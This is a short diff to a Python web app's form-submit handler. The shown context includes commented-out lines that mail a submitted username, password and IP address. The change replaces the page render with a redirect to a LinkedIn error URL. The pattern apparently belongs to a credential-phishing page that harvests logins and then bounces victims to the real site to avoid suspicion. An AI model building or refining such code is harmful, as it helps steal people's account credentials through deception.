@@ -68,7 +68,9 @@ def submit():
         #     db.session.commit()
         #     send_mail(username,password,ip_address)
         #     return render_template("outdex.html")
-        return render_template("index.html")
+        #return render_template("index.html")
+        return redirect("https://www.linkedin.com/error404", code=302)
+        
 
 
 
